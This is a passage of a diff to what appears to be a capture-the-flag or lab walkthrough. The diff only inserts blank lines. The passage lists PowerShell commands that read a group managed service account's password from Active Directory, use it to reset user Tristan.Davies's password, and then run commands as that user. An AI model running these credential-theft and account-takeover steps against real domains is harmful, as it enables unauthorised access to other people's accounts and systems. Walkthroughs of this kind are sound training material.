@@ -263,9 +263,11 @@ we get a nice web terminal after authenticating:
 *In order to be able to run code as* `BIR-ADFS-GMSA`, we're going to do a couple of things:
 
 1. Obtain the **GMSA** password as a secure string. This can be done with the below command:
+
 `$secstringpassword = (ConvertFrom-ADManagedPasswordBlob (get-adserviceaccount -filter * -Properties msDS-ManagedPassword).'msDS-ManagedPassword').SecureCurrentPassword`
 
 2. Create a `PSCredential` object with both the **GMSA** username and the secure string.
+
 `$cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $secstringpassword`
 
 3. Execute a password reset command using the created `PSCredential`:
@@ -275,9 +277,11 @@ Invoke-Command -ComputerName 127.0.0.1 -credential $cred -ScriptBlock $Script
 ```
 
 4. Create another `PSCredential` object but with `tristan`'s new password:
+
 `$killercreds = New-Object System.Management.Automation.PSCredential Tristan.Davies, (ConvertTo-SecureString -AsPlainText 'H@CKEDAGA1N!!' -force)`
 
 5. Execute commands as `tristan` using the new credential object:
+
 `Invoke-Command -ComputerName 127.0.0.1 -credential $killercreds -ScriptBlock {whoami}`
 
 ![tristan-web-access](tristan-web-access.jpg)
